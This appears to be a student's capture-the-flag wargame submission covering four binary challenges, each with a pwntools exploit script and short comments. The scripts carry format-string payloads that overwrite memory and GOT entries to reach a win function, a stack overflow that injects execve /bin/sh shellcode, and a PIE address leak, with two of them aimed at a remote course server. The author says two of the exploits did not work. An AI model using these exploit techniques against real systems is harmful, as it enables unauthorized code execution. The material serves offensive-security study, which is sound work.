==========================================================
Door
==========================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1kb29yIiwiaXAiOiIxMDEuMTY0LjMzLjIxOSIsInNlc3Npb24iOiI0YmUwNjM5Yi00NGZmLTQ0NWQtOGY4ZS0wMmZjMGRmZGNmNjYifQ.59gFu5H6lcbFxSuneIwOShDAKD370jex1jiYMm6cjE4}
==========================================================
Script used:
    #!/usr/bin/env python

    from pwn import *

    #p = process("./door")
    p = remote("plsdonthaq.me", 4001)

    p.recvuntil(" at ")
    address = int(p.recvuntil("\n", drop=True), 16)
    p.recvuntil("open:")

    distance = (0x218 - 0x210) / 4
    char = 0x53455041 # APES = 41 50 45 53

    payload = b"b"
    payload += p32(address + 0)
    payload += p32(address + 1)
    payload += p32(address + 2)
    payload += p32(address + 3)
    payload += b"%239c"

    for i in range(4):
        byte = char & 0xff
        char >>= 8
        if (byte == 0):
            payload += b"%{}$hhn".format(distance + i)
        else:
            payload+= b"%{}c%{}$hhn%{}c".format(byte, distance + i, 256 - byte)

    p.sendline(payload)

    p.interactive()

==========================================================


==========================================================
Snake
==========================================================
Comments:
    I'm unsure why my exploit wasn't working, I checked with gdb and it seemed that the EIP was being overwritten with the correct address and that all of the values were being written correctly, but it didn't seem to be able to execute the shellcode, it always segfaulted). I'll go through my thought process is solving what I could
 1. When the 'Print flag' option was chosen, and 80 or more bytes were written, the function
    would fail and instead print the memory address of the variable storing the input from the user (var_10), this buffer couldn't be overflowed.
 2. The buffer in the get_name function could be overflowed though, and it as 26 bytes below 
    the other buffer, so I attempted to write a 36 byte payload (shellscript to run /bin/sh), followed by the leaked address moved down 26 bytes to the get_name buffer. (address - 0x1A). I was able to successfully overwrite the EIP (when checking with gdb) but it was causing a segfault.
==========================================================
Script used:
    #!/usr/bin/python

    from pwn import *


    def find_address(p):
        p.recvuntil("Quit") 
        p.sendline("3")

        p.recvuntil("passwd:")
        p.sendline("A" * 80)

        p.recvuntil("offset ")
        address = int(p.recvuntil("\n", drop = True), 16)

        return address


    def set_name(p, name):
        p.recvuntil("Quit")
        p.sendline("1")

        p.sendline(name)


    p = process("./snake")

    address = find_address(p) # when password is printed, instead it prints (&var 10/&input)
    address -= (0x1A)         # move to the address of the get_name buffer (var_10 -> var_36)

    payload = b""
    payload += b"\x90" * (0x36 - 0x22 - 0x14) # 0x22 bytes for payload, 0x?? bytes for NOPs before address
    payload += asm("""

        push 0x0068732f
        push 0x6e69622f

        mov ebx, esp
        mov eax, 0xb
        mov ecx, 0
        mov edx, 0
        mov esi, 0

        int 0x80
        
        """)
    payload += b"\x90" * (0x14)
    payload += p32(address)

    pause()

    set_name(p, payload)

    p.interactive()

==========================================================



==========================================================
Formatrix
==========================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1mb3JtYXRyaXgiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6ImEyZjM3ZTFmLTE3NTQtNGY4My1hNjUyLTA1ZTA3NmVkNTIzNiJ9.WmoUQ0LzwufDf_TURKFepHAtL0ULKmHUzA-DAR2eKqc}
==========================================================
Comments:
    I'm submitting this late as I realised the mistake with my initial submission, I wasn't overwriting the address of the printf in the GOT, I was just overwriting printf

    The exploit is to simply overwrite the entry for print() in the GOT with the function pointer for win()
    
    This was pretty similar to what we did in the lab.
==========================================================
Script used:
    #!/usr/bin/python

    from pwn import *

    # p = process("./formatrix")
    p = remote("plsdonthaq.me", 4003)

    win    = 0x08048536 # the address of the win function
    printf = 0x08049c18 # the address of the printf function
    distance = ((0x620 - 0x210) / 4) - 1

    p.recvuntil("say:")

    payload = b""
    payload += p32(printf + 0)
    payload += p32(printf + 1)
    payload += p32(printf + 2)
    payload += p32(printf + 3)
    payload += b"%240c"

    for i in range(4):
        byte = win & 0xff
        win >>= 8
        if (byte == 0):
            payload += b"%{}$hhn".format(distance + i)
        else:
            payload += b"%{}c%{}$hhn%{}c".format(byte, distance + i, 256 - byte)

    p.sendline(payload)

    p.interactive()

==========================================================


==========================================================
Sploitwarz
==========================================================
Comments:
 1. Exploited a vulnerability with the printf after winning the gamble game.
 2. It would print out a value of the stack if given the arguments, the third value
    on the stack was (0x565...) which was the binary base with pie enabled, so I used to gdb to find the offset of do_gamble from the leaked address (info address do_gamble), and used binary_ninja to find the offset of the do_gamble function from the binary base
 3. After this I used this binary base (from subtracting the two offsets from the address) to
    find the address of the win() and printf() functions (added their offsets again from binary ninja to the binary base)
 4. Finally I had to use a similar payload as formatrix to overwrite the printf() GOT entry 
    with the win() function, I found out the format string was in the 9th argument on the stack, however I couldn't work out why using the offset 9 wasn't working, so I was unable to get the flag unfortunately.
==========================================================
Script used:
    #!/usr/bin/python

    from pwn import *


    def init(handle):
        p = process("./sploitwarz")
        p.recvuntil("handle?")
        p.sendline(handle)
        return p


    def gamble(p):
        p.recvuntil("do?")
        p.sendline("g")

        p.recvuntil("max ")
        max = p.recvuntil("):", drop=True) # the max amount you can gamble
        p.sendline(max)

        answer = check_fib(p) # the winning number is a non fibonacci number
        p.sendline("{}".format(answer))


    # the correct gambling option is the one not in the fibonacci sequence
    def check_fib(p): # takes in the five options and return the index of the correct option
        options = []
        p.recvuntil(":\n")
        for i in range(5):
            p.recvuntil("{}) ".format(i + 1))
            options.append(int(p.recvuntil("\n", drop=True)))
        
        for i in range(5):
            phi = options[i] * (0.5 + 0.5 * math.sqrt(5.0))
            if ((options[i] == 0) or (abs(round(phi) - phi) < (1.0 / options[i]))):
                continue
            return i + 1


    def change_handle(p, handle):
        p.recvuntil("do?")
        p.sendline("c")
        p.recvuntil("?")
        p.sendline(handle)


    def payload(win, target, offset):
        payload = b""
        payload += p32(target + 0)
        payload += p32(target + 1)
        payload += p32(target + 2)
        payload += p32(target + 3)
        payload += b"%240c"

        for i in range(4):
            byte = win & 0xff
            win >>= 8
            if (byte == 0):
                payload += b"%{}$hhn".format(offset + i)
            else:
                payload += b"%{}c%{}$hhn%{}c".format(byte + 0x100, offset + i, 256 - byte - 0x100)

        return payload

    # gamble contains a vulnerable printf (it prints the handle), so use a format string handle
    p = init("%3$p") # binary base address (0x565...)
    gamble(p)

    # grab the address from this printf
    p.recvuntil("0x")
    address = int(p.recvuntil("!", drop=True), 16)
    p.recvuntil("...")
    p.sendline()

    # offset of do_gamble from PIE binary is 0x1448
    # offset of the leaked address from do_gamble is 0x125 (ty gdb)
    base   = address - 0x0125 - 0x1448
    win    = base + 0x0ab4  # the offset of win from the PIE base
    printf = base + 0x3528  # the offset of printf from the PIE base

    payload = payload(win, printf, 9)

    change_handle(p, payload)

    pause()

    gamble(p)

    p.interactive()

==========================================================